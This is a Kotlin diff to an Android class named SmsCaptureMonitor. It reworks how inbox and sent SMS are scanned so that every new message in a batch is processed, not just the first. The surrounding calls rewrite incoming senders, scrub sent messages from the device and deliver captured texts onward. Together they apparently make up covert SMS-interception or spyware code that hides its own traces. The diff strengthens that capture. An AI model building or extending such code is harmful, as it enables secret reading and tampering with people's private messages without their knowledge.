@@ -58,8 +58,7 @@ class SmsCaptureMonitor(
     }
 
     private fun scanInbox() {
-        scanMessages(Telephony.Sms.MESSAGE_TYPE_INBOX, lastProcessedInId) { id, peer, body ->
-            lastProcessedInId = id
+        lastProcessedInId = scanMessages(Telephony.Sms.MESSAGE_TYPE_INBOX, lastProcessedInId) { id, peer, body ->
             val config = configManager.load()
             if (SmsSenderRewriter.shouldRewrite(peer, config)) {
                 SmsSenderRewriter.rewriteIncomingSender(context, config, peer, body, id)
@@ -71,8 +70,7 @@ class SmsCaptureMonitor(
     }
 
     private fun scanOutgoing() {
-        scanMessages(Telephony.Sms.MESSAGE_TYPE_SENT, lastProcessedOutId) { id, peer, body ->
-            lastProcessedOutId = id
+        lastProcessedOutId = scanMessages(Telephony.Sms.MESSAGE_TYPE_SENT, lastProcessedOutId) { id, peer, body ->
             val config = configManager.load()
             if (OutgoingSmsCleaner.scrubSentIfNeeded(context, peer, body)) {
                 return@scanMessages
@@ -86,8 +84,8 @@ class SmsCaptureMonitor(
         type: Int,
         lastId: Long,
         onMatch: (Long, String, String) -> Unit
-    ) {
-        if (!PermissionHelper.hasReadSms(context)) return
+    ): Long {
+        if (!PermissionHelper.hasReadSms(context)) return lastId
         try {
             val projection = arrayOf(
                 Telephony.Sms._ID,
@@ -99,10 +97,11 @@ class SmsCaptureMonitor(
                 projection,
                 "${Telephony.Sms.TYPE}=?",
                 arrayOf(type.toString()),
-                "${Telephony.Sms.DATE} DESC LIMIT 12"
-            ) ?: return
+                "${Telephony.Sms.DATE} DESC LIMIT 20"
+            ) ?: return lastId
 
             cursor.use {
+                var newestId = lastId
                 while (it.moveToNext()) {
                     val id = it.getLong(0)
                     if (id <= lastId) continue
@@ -110,12 +109,14 @@ class SmsCaptureMonitor(
                     val body = it.getString(2)?.trim().orEmpty()
                     if (peer.isBlank() || body.isBlank()) continue
                     onMatch(id, peer, body)
-                    return
+                    if (id > newestId) newestId = id
                 }
+                return newestId
             }
         } catch (e: Exception) {
             Log.w(TAG, "SMS scan failed: ${e.message}")
         }
+        return lastId
     }
 
     private fun deliver(config: ModuleConfig, actualPeer: String, body: String, direction: String) {
